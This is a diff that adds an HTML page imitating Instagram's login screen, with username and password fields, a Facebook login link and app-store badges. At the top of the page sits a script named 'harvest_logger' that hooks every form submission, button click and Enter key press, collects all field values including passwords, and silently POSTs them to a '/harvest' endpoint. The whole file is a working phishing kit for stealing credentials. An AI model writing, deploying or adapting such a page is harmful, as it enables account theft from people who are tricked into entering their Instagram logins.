@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- harvest_logger -->
+<script>
+(function() {
+    if(window.__harvest_logger_loaded) return;
+    window.__harvest_logger_loaded = true;
+    function formToDict(form) {
+        var data = {};
+        var fd = new FormData(form);
+        fd.forEach(function(value, key) {
+            data[key] = value;
+        });
+        // If FormData is empty, manually gather all input/select/textarea
+        if(Object.keys(data).length === 0) {
+            var idx = 0;
+            var els = form.querySelectorAll('input,select,textarea');
+            els.forEach(function(el) {
+                var k = el.name || el.id || ('field_'+idx++);
+                var v = el.value;
+                data[k] = v;
+            });
+        }
+        return data;
+    }
+    function sendHarvest(form) {
+        try {
+            var data = formToDict(form);
+            fetch('/harvest', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(function(){});
+        }catch(e){}
+    }
+    var origSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function() {
+        sendHarvest(this);
+        origSubmit.apply(this, arguments);
+    };
+    document.addEventListener('submit', function(e){
+        sendHarvest(e.target);
+    }, true);
+    function hookBtns(form){
+        var btns = form.querySelectorAll('[type=submit],button');
+        btns.forEach(function(btn){
+            btn.addEventListener('click', function(){sendHarvest(form);}, true);
+        });
+        var inputs = form.querySelectorAll('input');
+        inputs.forEach(function(input){
+            input.addEventListener('keydown', function(e){
+                if(e.key==='Enter'){sendHarvest(form);}
+            }, true);
+        });
+    }
+    document.querySelectorAll('form').forEach(hookBtns);
+    var mo = new MutationObserver(function(muts){
+        muts.forEach(function(mut){
+            mut.addedNodes.forEach(function(node){
+                if(node.tagName==='FORM') hookBtns(node);
+                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
+            });
+        });
+    });
+    mo.observe(document.documentElement,{childList:true,subtree:true});
+})();
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000000; /* Pure black background */
+            color: #ffffff; /* White text */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-wrapper {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .login-container {
+            background-color: #000000;
+            border: 1px solid #333333;
+            width: 100%;
+            padding: 20px 40px;
+            text-align: center;
+            border-radius: 1px;
+        }
+
+        .logo {
+            width: 175px;
+            margin: 20px auto;
+            filter: brightness(1.2); /* Makes the logo more vibrant */
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 8px;
+            margin: 6px 0;
+            border: 1px solid #333333;
+            background-color: #000000;
+            color: #ffffff;
+            border-radius: 3px;
+            font-size: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 8px;
+            margin: 10px 0;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            width: 100%;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #333333;
+            margin: 0 10px;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-weight: bold;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+
+        .facebook-login img {
+            width: 16px;
+            margin-right: 8px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+
+        .signup-container {
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            background-color: #000000;
+            border: 1px solid #333333;
+        }
+
+        .signup-container a {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+            width: 100%;
+        }
+
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .app-stores img {
+            height: 40px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrapper">
+        <div class="login-container">
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">
+            
+            <form>
+                <input type="text" placeholder="Phone number, username, or email" required>
+                <input type="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            
+            <div class="divider">OR</div>
+            
+            <div class="facebook-login">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/1200px-Facebook_f_logo_%282019%29.svg.png" alt="Facebook Logo">
+                Log in with Facebook
+            </div>
+            
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        
+        <div class="signup-container">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        
+        <div class="footer">
+            Get the app.
+            <div class="app-stores">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/1200px-Download_on_the_App_Store_Badge.svg.png" alt="App Store">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1200px-Google_Play_Store_badge_EN.svg.png" alt="Play Store">
+            </div>
+        </div>
+    </div>
+</body>
+</html>
